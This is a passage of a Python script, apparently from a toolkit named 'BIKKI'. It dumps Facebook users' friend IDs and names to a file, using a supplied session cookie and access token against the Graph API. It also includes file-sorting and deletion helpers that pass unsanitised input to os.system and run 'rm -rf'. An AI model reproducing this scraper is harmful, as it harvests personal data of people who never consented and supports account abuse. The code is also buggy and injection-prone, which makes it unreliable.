        apnd = open(filepath , 'a')
        clear()
        for rept in range(srange):
            rept += 1
            sid = input("[" + str(rept) + "] Put id username: ")
            if  sid=='stop':
                break
                ys.close()
            try:
                dmp = requests.get("https://graph.facebook.com/"+sid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    totaldmp+=1
                    apnd.write(idnm['id']+"|"+idnm['name']+'\n')                      
            except KeyError:
                print(f"\n{S}ID Not Found ...");pass
            print(f'{S}Total IDs : {totaldmp}')
        apnd.close()
        print(47*'-')
        print(f"Total IDs: {totaldmp} ")
        print(f"File Saved To  {filepath} ")
        print(47*'-')
        input("Press enter to back BIKKI Menu ")
        BIKKI(allkey)
    except Exception as e:
        print("Error : %s"%e) 
        
def cutter():
    clear()
    print("Enter File Path / File Location \n")
    BIKKI = input('Put File Name:')
    print(" ")
    BIKKI = input('Saving Put File Name:')
    os.system('touch ' +BIKKI)
    os.system('sort -r '+BIKKI+' | uniq > '+BIKKI)
    os.system('clear')
    print(logo)
    print("Removed Successful From File: " + BIKKI )
    print("New File Saved:" + BIKKI )
    print(47*'-')
    input(f"{S} Press Enter To Back BIKKI Menu ")
    BIKKI(allkey)       
    
def removef():
        os.system('rm -rf self.file');print(f'\n{R}Files Removed Successfully ...')
        BIKKI(allkey)            
 

BIKKI()
